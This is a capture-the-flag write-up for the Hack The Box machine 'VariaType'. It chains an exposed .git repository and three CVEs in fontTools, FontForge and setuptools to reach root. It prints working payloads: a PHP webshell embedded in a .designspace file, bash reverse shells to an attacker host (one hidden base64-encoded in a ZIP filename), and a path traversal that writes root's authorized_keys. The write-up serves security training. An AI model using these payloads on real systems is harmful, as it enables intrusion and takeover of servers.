---
title: VariaType
layout: post
released: 2026-05-31
creators: htb
pwned: true
tags:
  - boxes
  - os/linux
  - diff/medium
  - type/machine
category:
  - HTB
description: "VariaType chains three CVEs: exposed .git with hardcoded credentials, CVE-2025-66034 in fontTools (arbitrary file write → webshell), CVE-2024-25082 in FontForge (ZIP filename command injection → shell as steve), and CVE-2025-47273 in setuptools (path traversal → SSH key write → root)."
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/1c63aff74baeaf6afdb5f35519756ab1.png
---

![VariaType](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/1c63aff74baeaf6afdb5f35519756ab1.png)

# Enumeration
## Scans

As usual we start off with an `nmap` port scan.

```bash
nmap -sC -sV -T4 --open -p- --min-rate 5000 -oN nmap.txt <TARGET_IP>
```
{:filename="nmap_full.txt"}

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5f:a5:6a:89:37:b6:a2:f5:7b:24:83:0c:af:6e:4a:1a (ECDSA)
|_  256 1a:53:94:76:81:e8:d2:6c:7f:b0:12:15:39:ca:8c:45 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb
|_http-server-header: nginx/1.22.1
```

HTTP redirects to `variatype.htb`. Adding to `/etc/hosts`:

```bash
echo "<TARGET_IP> variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
```

## Port 80

Visiting the web server we're greeted with a corporate site for a variable font design company. The `/tools/variable-font-generator` endpoint offers an online font generation tool. Let's enumerate subdomains:

```bash
ffuf -u http://variatype.htb -H "Host: FUZZ.variatype.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc 200,301,302 -fs 0 -t 50
```

```
portal                  [Status: 200, Size: 3241]
```

`portal.variatype.htb` presents an internal portal with a login form. Directory brute-force reveals something interesting:

```bash
ffuf -u http://portal.variatype.htb/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
     -mc 200,301,403 -t 40
```

```
.git/HEAD               [Status: 200, Size: 23]
.git/config             [Status: 200, Size: 186]
index.php               [Status: 200, Size: 3241]
```

The `.git/` directory listing returns 403, but individual files are readable — classic misconfiguration.

# Foothold
## Step 1 — Exposed .git + Hardcoded Credentials

Dumping the repository with `git-dumper`:

```bash
pip3 install git-dumper --break-system-packages
git-dumper http://portal.variatype.htb/.git/ ./repo
cd repo
git log --oneline --all
```

```
753b5f5 fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
```

Examining the diff of the fixup commit:

```bash
git show 753b5f5
```

```diff
-// TODO: move to env
-$gitbot_user = 'gitbot';
-$gitbot_pass = 'G1tB0t_Acc3ss_2025!';
```

Credentials `gitbot:G1tB0t_Acc3ss_2025!` were hardcoded in `auth.php` before being removed. Logging into the portal gives us access to a font validation pipeline dashboard with a file upload form accepting `.ttf`, `.otf`, and `.designspace` files.

## Step 2 — CVE-2025-66034 (fontTools Arbitrary File Write → Webshell)

**Vulnerability:** fontTools ≤ 4.55.3 does not sanitise the `filename` attribute in `<variable-font>` tags within `.designspace` files. When generating a variable font, the output is written to the path specified in `filename` without any path traversal checks. An attacker can write arbitrary content to any path writable by the web server process.

**CVSS 9.8** — critical. No authentication required in the upstream design; we have credentials from step 1, but the vulnerability is exploitable regardless.

### Generating source TTF files

fontTools requires at least two valid TTF masters for interpolation:

```python
# gen_fonts.py
from fontTools.fontBuilder import FontBuilder

def make_ttf(name, path):
    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    fb.setupGlyf({".notdef": {"numberOfContours": -1, "components": []}})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupNameTable({"familyName": name, "styleName": "Regular"})
    fb.setupOs2()
    fb.setupPost()
    fb.setupHead(unitsPerEm=1000)
    fb.font.save(path)
    print(f"[+] saved {path}")

make_ttf("VarLight",   "source-light.ttf")
make_ttf("VarRegular", "source-regular.ttf")
```

```bash
python3 gen_fonts.py
```

### Crafting the malicious .designspace

Server error messages leak the web root at `/var/www/portal.variatype.htb/`. Setting `filename` to an absolute path in the web-accessible `files/` directory:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="4.1">
  <axes>
    <axis tag="wght" name="Weight" minimum="300" default="400" maximum="700"/>
  </axes>
  <sources>
    <source filename="source-light.ttf" familyname="Var" stylename="Light">
      <location><dimension name="Weight" xvalue="300"/></location>
    </source>
    <source filename="source-regular.ttf" familyname="Var" stylename="Regular">
      <location><dimension name="Weight" xvalue="700"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="exploit" filename="/var/www/portal.variatype.htb/public/files/cmd.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
  <lib>
    <dict><key>public.skipExportGlyphs</key><array/></dict>
  </lib>
  <labelname xml:lang="en"><![CDATA[{% raw %}<?php if(isset($_REQUEST['cmd'])){echo '<pre>'.shell_exec($_REQUEST['cmd']).'</pre>';}?>{% endraw %}]]></labelname>
</designspace>
```

The `<labelname>` content ends up in the font metadata and gets written as the output file body when fontTools processes the `.designspace`. Uploading all three files through the portal dashboard triggers the write.

### Confirming RCE

```bash
curl -s "http://portal.variatype.htb/files/cmd.php?cmd=id"
```

```
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

Getting a reverse shell:

```bash
# Kali listener
nc -lvnp 4444

# Trigger
curl -s "http://portal.variatype.htb/files/cmd.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'"
```

Shell as `www-data`.

## Step 3 — CVE-2024-25082 (FontForge ZIP Filename Command Injection → steve)

**Vulnerability:** FontForge passes ZIP archive filenames directly to the system shell without sanitisation. A filename containing `$(...)` causes shell expansion and executes the embedded command. Since `/` is not permitted in filenames, we bypass this using `base64 -d`.

### Finding the processing daemon

```bash
find /opt /srv /var -name "*.sh" 2>/dev/null | xargs grep -l "fontforge" 2>/dev/null
```

```
/opt/validate/process_submissions.sh
```

```bash
cat /opt/validate/process_submissions.sh
```

```bash
#!/bin/bash
WATCH_DIR="/var/www/portal.variatype.htb/public/uploads"
while true; do
    for zip in "$WATCH_DIR"/*.zip; do
        [ -f "$zip" ] || continue
        fontforge -script /opt/validate/validate_font.py "$zip"
        rm -f "$zip"
    done
    sleep 10
done
```

Checking `ps aux` confirms the daemon runs as user `steve`. It polls `uploads/` every 10 seconds.

### Building the exploit ZIP

```bash
# On Kali
LHOST="<KALI_IP>"
LPORT="5555"

# Encode payload to avoid / in filename
PAYLOAD=$(echo -n "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1" | base64 -w0)
FNAME="\$(echo ${PAYLOAD}|base64 -d|bash).ttf"

python3 -c "
import zipfile
zf = zipfile.ZipFile('/tmp/exploit.zip', 'w')
zf.writestr('$FNAME', 'dummy')
zf.close()
print('[+] exploit.zip created')
"
```

Deliver the ZIP via the webshell and wait for the daemon:

```bash
# Serve from Kali
python3 -m http.server 8888

# In www-data shell
wget http://<KALI_IP>:8888/exploit.zip -O /var/www/portal.variatype.htb/public/uploads/exploit.zip

# Kali listener
nc -lvnp 5555
```

Within 10 seconds the daemon picks up the ZIP and executes our payload.

```bash
id
# uid=1001(steve) gid=1001(steve)
cat /home/steve/user.txt
```

# Privilege Escalation
## Step 4 — CVE-2025-47273 (setuptools Path Traversal → root)

**Vulnerability:** setuptools < 78.1.1 in `PackageIndex.download()` validates the download path **before** URL-decoding. `%2F` (encoded `/`) passes the traversal check, but is decoded to `/` when writing the file to disk. Result: arbitrary file write to any path accessible by the calling process.

### Checking sudo permissions

```bash
sudo -l
```

```
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

```bash
cat /opt/font-tools/install_validator.py | grep -i "setuptools\|download\|PackageIndex"
```

The script downloads a plugin by URL using `setuptools.PackageIndex().download()` and runs it. The installed version is `setuptools==78.0.0` — vulnerable.

### Writing an SSH key as root

```bash
# On Kali — generate a key pair
ssh-keygen -t ed25519 -f /tmp/varia_root -N ""
cat /tmp/varia_root.pub
```

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBxf...kali@kali
```

Serve the public key from a directory named to match what setuptools will save it as:

```bash
mkdir -p /tmp/serve
cp /tmp/varia_root.pub /tmp/serve/authorized_keys
cd /tmp/serve && python3 -m http.server 8080
```

Trigger the path traversal in the `steve` shell:

```bash
# %2F decodes to / AFTER the path check passes
# setuptools saves to: /tmp/validator_pkg/ + ../../root/.ssh/authorized_keys
# = /root/.ssh/authorized_keys
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://<KALI_IP>:8080/%2Froot%2F.ssh%2Fauthorized_keys"
```

```bash
# Kali
ssh -i /tmp/varia_root root@variatype.htb
cat /root/root.txt
```

# Root

```
Exposed .git → git-dumper → hardcoded creds gitbot:G1tB0t_Acc3ss_2025!
    ↓
CVE-2025-66034 fontTools designspace filename injection
    ↓ write PHP webshell → /files/cmd.php → RCE as www-data
CVE-2024-25082 FontForge ZIP filename command injection
    ↓ base64 reverse shell in filename → daemon executes → shell as steve
    ↓ user.txt
CVE-2025-47273 setuptools PackageIndex path traversal
    ↓ sudo install_validator.py "http://kali/%2Froot%2F.ssh%2Fauthorized_keys"
    ↓ SSH public key written to /root/.ssh/authorized_keys
SSH as root → root.txt
```

| CVE | Component | CVSS | Class |
|-----|-----------|------|-------|
| CVE-2025-66034 | fontTools varLib ≤ 4.55.3 | 9.8 | Arbitrary File Write |
| CVE-2024-25082 | FontForge | 7.8 | OS Command Injection |
| CVE-2025-47273 | setuptools < 78.1.1 | 7.7 | Path Traversal → Arbitrary Write |
